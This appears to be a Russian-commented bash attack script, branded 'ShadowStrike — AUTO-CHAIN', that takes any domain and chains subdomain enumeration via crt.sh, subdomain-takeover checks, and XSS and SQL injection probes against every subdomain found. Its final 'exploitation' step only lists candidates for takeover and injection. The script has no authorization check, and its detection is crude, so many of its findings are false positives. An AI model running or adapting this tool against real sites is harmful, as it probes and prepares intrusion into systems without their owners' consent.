#!/bin/bash
# Auto-Chain — автоматическая цепочка атак
# Поддомены → Takeover → Инъекции → Эксплуатация

TARGET=$1
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
[ -z "$TARGET" ] && echo "Usage: $0 target.com" && exit 1

CHAIN_DIR="$HOME/.shadow_chain_$DOMAIN"
mkdir -p "$CHAIN_DIR"

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — AUTO-CHAIN                 ║"
echo "╚══════════════════════════════════════════════╝"

# Шаг 1: Поддомены
echo "[CHAIN 1/4] Поиск поддоменов..."
curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
    grep -oP '"name_value":"\K[^"]+' | sort -u | grep -v "^*" > "$CHAIN_DIR/subdomains.txt"
SUBS=$(wc -l < "$CHAIN_DIR/subdomains.txt")
echo "  Найдено: $SUBS поддоменов"

# Шаг 2: Проверка Subdomain Takeover
echo "[CHAIN 2/4] Проверка Subdomain Takeover..."
while read sub; do
    [ -z "$sub" ] && continue
    RESP=$(curl -sk --max-time 5 "http://$sub" -o /dev/null -w "%{http_code}" 2>/dev/null)
    
    # Проверяем признаки Takeover
    PAGE=$(curl -sk --max-time 5 "http://$sub" 2>/dev/null)
    if echo "$PAGE" | grep -qi "no such app\|not found\|domain doesn't exist\|is not configured"; then
        echo "  🔴 TAKEOVER: $sub" >> "$CHAIN_DIR/takeovers.txt"
    fi
    
    # Проверяем CNAME
    CNAME=$(dig +short "$sub" CNAME 2>/dev/null)
    if echo "$CNAME" | grep -qi "github.io\|azurewebsites.net\|cloudfront.net\|amazonaws.com"; then
        echo "  🟡 CNAME: $sub → $CNAME" >> "$CHAIN_DIR/cnames.txt"
    fi
done < "$CHAIN_DIR/subdomains.txt"

TAKEOVERS=$(wc -l < "$CHAIN_DIR/takeovers.txt" 2>/dev/null || echo 0)
echo "  Takeover: $TAKEOVERS"

# Шаг 3: Инъекции на найденных поддоменах
echo "[CHAIN 3/4] Инъекции на поддоменах..."
while read sub; do
    [ -z "$sub" ] && continue
    
    # XSS
    resp=$(curl -sk --max-time 5 "http://$sub?q=<script>alert(1)</script>" 2>/dev/null)
    echo "$resp" | grep -q "<script>alert(1)</script>" && echo "  💉 XSS: $sub" >> "$CHAIN_DIR/injections.txt"
    
    # SQLi
    resp=$(curl -sk --max-time 5 "http://$sub?id=1' OR '1'='1" 2>/dev/null)
    echo "$resp" | grep -qi "sql\|error\|syntax" && echo "  💉 SQLi: $sub" >> "$CHAIN_DIR/injections.txt"
done < "$CHAIN_DIR/subdomains.txt"

INJECTIONS=$(wc -l < "$CHAIN_DIR/injections.txt" 2>/dev/null || echo 0)
echo "  Инъекций: $INJECTIONS"

# Шаг 4: Эксплуатация
echo "[CHAIN 4/4] Эксплуатация..."
if [ -f "$CHAIN_DIR/takeovers.txt" ]; then
    echo "  Можно захватить поддомены из $CHAIN_DIR/takeovers.txt"
fi
if [ -f "$CHAIN_DIR/injections.txt" ]; then
    echo "  Можно эксплуатировать инъекции из $CHAIN_DIR/injections.txt"
fi

echo ""
echo "[CHAIN] Готово! Отчёт: $CHAIN_DIR"
echo "  Поддоменов: $SUBS"
echo "  Takeover: $TAKEOVERS"
echo "  Инъекций: $INJECTIONS"
